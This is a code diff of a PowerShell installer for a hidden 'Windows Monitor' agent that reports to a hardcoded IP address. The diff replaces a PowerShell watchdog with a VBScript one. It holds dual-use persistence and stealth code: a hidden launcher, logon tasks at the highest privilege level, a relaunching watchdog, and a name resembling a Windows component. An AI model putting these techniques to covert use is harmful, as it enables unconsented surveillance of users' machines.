@@ -14,14 +14,14 @@ $script:MainTaskName = "Windows Monitor"
 $script:WatchdogTaskName = "Windows Monitor Watchdog"
 $script:ServerHost = "108.187.15.71"
 $script:ServerPort = "8899"
-$script:InstallDir = Join-Path $env:ProgramData "Windows Monitor"
+$script:InstallDir = Join-Path $env:ProgramData "WindowsMonitor"
 $script:UserDataDir = Join-Path $env:LOCALAPPDATA "Windows Monitor"
 $script:LegacyUserDataDir = Join-Path $env:LOCALAPPDATA "MonitorAgent"
 $script:LegacyLauncherPath = Join-Path $script:LegacyUserDataDir "run-hidden.vbs"
 $script:InstallExe = Join-Path $script:InstallDir "$script:ProcessName.exe"
 $script:SourceExe = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Path) "monitor-agent.exe"
 $script:LauncherPath = Join-Path $script:InstallDir "run-hidden.vbs"
-$script:WatchdogPath = Join-Path $script:InstallDir "watchdog.ps1"
+$script:WatchdogPath = Join-Path $script:InstallDir "watchdog.vbs"
 $script:ConfigPath = Join-Path $script:InstallDir "config.json"
 $script:LogDir = Join-Path $script:UserDataDir "logs"
 $script:LogPath = Join-Path $script:LogDir "install.log"
@@ -173,20 +173,23 @@ WshShell.Run """" & "$exe" & """ --background", 0, False
 }
 
 function Write-WatchdogScript {
-    $launcher = $script:LauncherPath.Replace("'", "''")
+    $launcher = $script:LauncherPath.Replace('"', '""')
     $processName = $script:ProcessName
     $content = @"
-`$proc = Get-Process -Name '$processName' -ErrorAction SilentlyContinue
-if (-not `$proc) {
-    Start-Process -FilePath 'wscript.exe' -ArgumentList '"$launcher"' -WindowStyle Hidden
-}
+Set WshShell = CreateObject("WScript.Shell")
+Set WMI = GetObject("winmgmts:\\.\root\cimv2")
+Set Procs = WMI.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name = '$processName.exe'")
+If Procs.Count = 0 Then
+    WshShell.Run """" & "$launcher" & """", 0, False
+End If
 "@
-    Set-Content -Path $script:WatchdogPath -Value $content -Encoding UTF8
+    Set-Content -Path $script:WatchdogPath -Value $content -Encoding ASCII
+    Remove-Item -LiteralPath (Join-Path $script:InstallDir "watchdog.ps1") -Force -ErrorAction SilentlyContinue
 }
 
 function New-MonitorTasks {
     $mainAction = "wscript.exe `"$script:LauncherPath`""
-    $watchdogAction = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script:WatchdogPath`""
+    $watchdogAction = "wscript.exe `"$script:WatchdogPath`""
 
     $mainOut = Invoke-NativeQuiet "schtasks.exe" @("/Create", "/TN", $script:MainTaskName, "/TR", $mainAction, "/SC", "ONLOGON", "/RL", "HIGHEST", "/IT", "/F")
     if ($mainOut.ExitCode -ne 0) {
